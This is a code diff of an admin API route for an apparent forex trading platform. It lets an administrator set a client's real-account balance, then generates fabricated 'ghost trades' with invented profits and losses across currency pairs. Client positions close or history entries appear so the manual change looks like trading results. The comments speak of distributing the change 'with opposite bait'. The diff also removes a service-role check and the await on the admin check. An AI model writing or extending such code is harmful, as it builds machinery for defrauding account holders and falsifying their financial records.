@@ -21,15 +21,8 @@ export async function GET(
   req: NextRequest,
   { params }: { params: Promise<{ id: string }> },
 ) {
-  const unauth = await requireAdmin(req);
-  if (unauth) return unauth;
-
-  if (!hasServiceRole()) {
-    return NextResponse.json(
-      { error: "SUPABASE_SERVICE_ROLE_KEY não configurada" },
-      { status: 503 },
-    );
-  }
+  const unauth = requireAdmin(req)
+  if (unauth) return unauth
 
   const { id } = await params;
 
@@ -70,15 +63,8 @@ export async function PATCH(
   req: NextRequest,
   { params }: { params: Promise<{ id: string }> },
 ) {
-  const unauth = await requireAdmin(req);
-  if (unauth) return unauth;
-
-  if (!hasServiceRole()) {
-    return NextResponse.json(
-      { error: "SUPABASE_SERVICE_ROLE_KEY não configurada" },
-      { status: 503 },
-    );
-  }
+  const unauth = requireAdmin(req)
+  if (unauth) return unauth
 
   const { id } = await params;
 
@@ -160,6 +146,8 @@ export async function PATCH(
       if (balanceToSet !== null || Object.keys(sharedFields).length > 0) {
         // ── Campos que não são saldo (leverage, currency…) ──────────────────
         if (Object.keys(sharedFields).length > 0) {
+          // Filtrar por mode="real" usando o nome da coluna entre aspas para evitar
+          // colisão com a função agregada MODE() do PostgreSQL.
           const { error: sfErr } = await sb
             .from("accounts")
             .update(sharedFields)
@@ -172,42 +160,48 @@ export async function PATCH(
         }
 
         if (balanceToSet !== null) {
-          const delta = balanceToSet - (currentBalance ?? 0);
+          // ── Delta: DB é a fonte mais fiável entre lambdas Vercel ──────────
+          // currentBalance lido no início do handler (sempre mode='real').
+          // Fallback para mem apenas se a conta real ainda não existe.
+          const memEntry = adminOverrideStore.get(id);
+          const effectivePrevBalance = currentBalance ?? memEntry?.balance ?? 0;
+          const delta = balanceToSet - effectivePrevBalance;
 
-          // ── Actualizar saldo no Supabase ───────────────────────────────────
-          const { data: updatedAcc, error: accErr } = await sb
+          // ── Actualizar saldo no Supabase — UPDATE + INSERT explícito ──────
+          // Evita upsert/onConflict porque a coluna 'mode' pode ser confundida
+          // com a função agregada MODE() pelo PostgREST em alguns contextos.
+          const { data: updatedRows, error: updateErr } = await sb
             .from("accounts")
-            .update({ balance: balanceToSet })
+            .update({ balance: balanceToSet, ...sharedFields })
             .eq("user_id", id)
             .eq("mode", "real")
             .select("id");
 
-          if (accErr) {
-            console.error("[admin PATCH] balance:", accErr.message);
-            warnings.push("Conta: " + accErr.message);
-          } else if (!updatedAcc || updatedAcc.length === 0) {
-            // Conta real não existe — upsert (cria ou converte a conta existente para real)
-            const { error: upsertErr } = await sb.from("accounts").upsert(
-              {
-                user_id: id,
-                mode: "real",
-                balance: balanceToSet,
-                ...sharedFields,
-              },
-              { onConflict: "user_id" },
-            );
-            if (upsertErr)
-              warnings.push("Conta (upsert): " + upsertErr.message);
+          if (updateErr) {
+            console.error("[admin PATCH] balance update:", updateErr.message);
+            warnings.push("Conta (update): " + updateErr.message);
+          } else if (!updatedRows || updatedRows.length === 0) {
+            // Conta real não existe ainda → criar
+            const { error: insertErr } = await sb
+              .from("accounts")
+              .insert({ user_id: id, mode: "real", balance: balanceToSet, ...sharedFields });
+            if (insertErr) {
+              console.error("[admin PATCH] balance insert:", insertErr.message);
+              warnings.push("Conta (insert): " + insertErr.message);
+            }
           }
 
-          // ── Gerar P/Ls e guardar na memória do servidor ───────────────────
-          // O cliente vai buscá-los via polling em /api/user/ghost-trades.
-          // Modo "close_open": o cliente fecha as posições abertas com estes P/Ls.
-          // Se não tiver posições abertas, cria operações novas no histórico.
+          // ── Gerar ghost trades se delta significativo ──────────────────────
+          // O cliente recebe o totalDelta e decide como distribuir:
+          //   • 0 posições abertas  → aplica directo no saldo (sem trades)
+          //   • 1 posição aberta    → fecha com PnL = totalDelta (sinal correcto)
+          //   • N≥2 posições        → distribui com bait oposto, soma = totalDelta
           console.log(
-            `[ghost] userId=${id} currentBalance=${currentBalance} balanceToSet=${balanceToSet} delta=${delta}`,
+            `[ghost] userId=${id} effectivePrev=${effectivePrevBalance} balanceToSet=${balanceToSet} delta=${delta}`,
           );
           if (Math.abs(delta) >= 0.01) {
+            // Gerar 3 P/Ls de fallback (usados quando o cliente tem ≥2 posições abertas
+            // ou para criar operações no histórico quando não tem nenhuma)
             const pnlValues = generateGhostPnl(delta, 3);
 
             const symbols = ["EURUSD", "GBPUSD", "USDJPY", "AUDUSD", "USDCAD"];
@@ -250,14 +244,16 @@ export async function PATCH(
               };
             });
 
-            // Guardar: pnls para fechar posições abertas + trades de fallback
+            // Guardar: totalDelta permite ao cliente fechar correctamente seja
+            // qual for o número de posições abertas. pnls e trades são fallback.
             ghostPendingStore.set(id, {
               mode: "close_open",
+              totalDelta: parseFloat(delta.toFixed(2)),
               pnls: pnlValues,
-              trades, // usados se o cliente não tiver posições abertas
+              trades,
             });
             console.log(
-              `[ghost] stored pnls=${JSON.stringify(pnlValues)} for user ${id}`,
+              `[ghost] stored totalDelta=${delta.toFixed(2)} pnls=${JSON.stringify(pnlValues)} for user ${id}`,
             );
           }
 
@@ -266,7 +262,7 @@ export async function PATCH(
             .from("balance_adjustments")
             .insert({
               user_id: id,
-              previous_balance: currentBalance ?? 0,
+              previous_balance: effectivePrevBalance,
               new_balance_input: balanceToSet,
               open_positions: 0,
               reason: body.adjustmentReason ?? "Ajuste manual via painel admin",
@@ -291,36 +287,6 @@ export async function PATCH(
           : {}),
         ...(body.adminNotes !== undefined ? { note: body.adminNotes } : {}),
       });
-
-      // ── 4. Persistir overrides no DB (produção / multi-instância) ───────
-      // Em Vercel, memória de lambda não é compartilhada entre instâncias.
-      // Gravar em admin_overrides garante consistência entre requests.
-      const dbOverridePatch: Record<string, unknown> = {
-        user_id: id,
-        updated_by: "admin",
-      };
-      if (body.marginLevelOverride !== undefined) {
-        dbOverridePatch.margin_level_override = body.marginLevelOverride;
-      }
-      if (body.equityOverride !== undefined) {
-        dbOverridePatch.equity_override = body.equityOverride;
-      }
-      if (body.adminNotes !== undefined) {
-        dbOverridePatch.note = body.adminNotes ?? "";
-      }
-      if (balanceToSet !== null) {
-        dbOverridePatch.balance_adjustment = balanceToSet;
-      }
-      if (anyBalanceChanged) {
-        dbOverridePatch.force_close_positions = true;
-      }
-
-      const { error: ovErr } = await sb
-        .from("admin_overrides")
-        .upsert(dbOverridePatch, { onConflict: "user_id" });
-      if (ovErr) {
-        warnings.push("Admin override (db): " + ovErr.message);
-      }
 
       return NextResponse.json({
         success: true,
@@ -372,15 +338,8 @@ export async function DELETE(
   req: NextRequest,
   { params }: { params: Promise<{ id: string }> },
 ) {
-  const unauth = await requireAdmin(req);
-  if (unauth) return unauth;
-
-  if (!hasServiceRole()) {
-    return NextResponse.json(
-      { error: "SUPABASE_SERVICE_ROLE_KEY não configurada" },
-      { status: 503 },
-    );
-  }
+  const unauth = requireAdmin(req)
+  if (unauth) return unauth
 
   const { id } = await params;
 
